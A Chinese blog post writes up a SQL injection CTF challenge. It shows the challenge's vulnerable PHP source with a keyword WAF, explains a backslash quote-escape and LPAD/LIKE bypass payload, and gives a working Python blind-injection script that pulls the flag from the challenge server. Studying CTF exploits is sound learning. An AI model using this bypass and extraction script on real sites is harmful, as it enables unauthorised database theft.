---
title: 记录一次hgame ctf的注入
url: 242.html
id: 242
categories:
  - CTF
  - sql注入
  - 学习笔记
date: 2018-02-28 21:13:54
tags:
---

### 前言

组里莫名开始在线上刷hgame，一个寒假没碰过这些，而且不得不说杭电的题目有点难，可能也是自己太菜了，总之这回的week4差不多无从下手。 然后今天要记录的是这道题 
![](http://blog.kingkk.com/wp-content/uploads/2018/02/5be75d06bcd7c644ac6d2864ab2a1d64.png) 
![](http://blog.kingkk.com/wp-content/uploads/2018/02/645f4302a1a8a6cd2e8246ed6f767e39.png) 
根据那个描述，应该能猜到有文件泄露，找了下备份文件index.php~
```php
<?php error_reporting(0); include("sql.php"); $waf="/(sleep|benchmark|union|group by|=|>|<|hex| |lower|strcmp|updatexml|xmlelement|extractvalue|concat|bin|sleep|mid\\(|substr|left|ascii|\\/\\*|\\*\\/)/i";
    if(isset($_GET\['user'\])){
        if(preg\_match\_all($waf,$_GET\['user'\])!=0){
            $user="admin";
        }else{
            $user = str\_replace("'","\\'",$\_GET\['user'\]);
        }
        //echo $user."
";
        
        $sqli = new mysqli($host,$username,$passwd,$database);
        $sqli->set_charset("gbk");
        $query="select * from users where username='".$user."'";
        $result = $sqli->query($query);
        //echo $sqli->error;
        $num=0;
        @$num = $result->num_rows;
        if($num>0){
            while($row = $result->fetch_row()){
                echo $row\[0\]."    ".$row\[1\]."   ".$row\[2\]."
";
            }
        }
    }
```
过滤了好多，对于我这种只会基础注入的，差不多就gg了，最后组里大佬给的一个payload

**?user=lufei\\'or(Lpad(user(),1,1)like(0x5f))%23** 

 

### 正文

先解释一下这段payload  

#### \\'

注意到这里对单引号的处理有点特殊，它的处理并不在$waf中，而是单独对 ' 进行替换成  \\'

$user = str\_replace("'","\\'",$\_GET\['user'\]);

然后这里输入 lufei\\' 的时候，就会变成 lufei\\\'   ，正好将转移的那个反斜杠通过之前的反斜杠吃掉了，从而造成了单引号逃逸

##### LPAD(str,len,padstr)

> 返回字符串str，左填充用字符串padstr填补到len字符长度。 如果str为大于len长，返回值被缩短至len个字符
```sql
mysql> select lpad(user(),20,'a');
+----------------------+
| lpad(user(),20,'a') |
+----------------------+
| aaaaaaroot@localhost |
+----------------------+
1 row in set (0.00 sec)
```
同理还有右填充 rpad,  但是当len参数小于str的长度时，返回的字符串将被缩短
```sql
mysql> select lpad(user(),1,'a');
+--------------------+
| lpad(user(),1,'a') |
+--------------------+
| r                  |
+--------------------+
1 row in set (0.00 sec)
```
这样，就找到了一个返回字符串的函数，绕过了waf  

#### **like**

会对字符串进行匹配（不区分大小写） 两个通配符

*   %    匹配任意多字符串
*   _      匹配单个任意字符

这样，就找了绕过等号（=）限制的一个符号  

### 脚本

接下来就写了个脚本进行注入 写脚本写了好久，不过手工注入貌似要更久的时间，而且看最后出来的flag长度，就是想让你自己写脚本跑 写脚本时有几个注意点

*   编写py时，url编码不能放到get的参数中，因为不会进行url encode，比如%23必须要写成#，否则传入到sql语句的还是%23不会变成#。还有%0a也要写成\\n或者chr(10)
*   like匹配时会匹配上%、_两个符号，以及不会区分大小写，要自己进行处理
*   由于单引号  '  的不可用，要转成十六进制进行like比较

然后废话不多说，show you the code
```python
__author__ = 'kingkk'
#encoding=utf8
import requests, re

sql = "select thisisflag from flllllag limit 0,1"


sql = re.subn('\s',chr(10),sql)[0]
hex_range = [i for i in range(130) if i!=37 and i!=95]
strlist = []

for str_len in range(1,50):
	for i in hex_range:
		if str_len == 1:
			params={"user":r"a\'or(Lpad(({}),1,1)like({}))#".format(sql,hex(i))}
			r = requests.get("http://118.25.18.223:10088/index.php",params=params)
			if r.text[:5] == 'admin':
				strlist.append(i)
				break
		else:
			params={"user":r"a\'or(Lpad(({}),{},1)like({}))#".format(sql,str_len,hex_str+hex(i)[2:])}
			r = requests.get("http://118.25.18.223:10088/index.php",params=params)
			if r.text[:5] == 'admin':
				strlist.append(i)
				break	

	for x,i in enumerate(strlist):
		if x==0:
			hex_str = str(hex(i))
		else:
			hex_str += str(hex(i)[2:])

	for i in strlist:
		print(chr(i),end="")
	print()

	print(strlist)
```
  最后的flag（这个手工注怕是要死人，可能就是故意搞得那么长的） 
![](http://blog.kingkk.com/wp-content/uploads/2018/02/1a34865a573b0ac7c466bf9cc6ee10cd.png) 
最后吐槽一句，原来虽然sql语句关键词不区分大小写，但数据库名那些是区分大小写的，怪不得之前试了好久都没出来，难受  

### 总结

本以为自己还算会一点sql注入，后来发现，其实还是啥都不会 慢慢补把，下学期的ctf要认真对待下了，而且sql过waf这个确实也要学学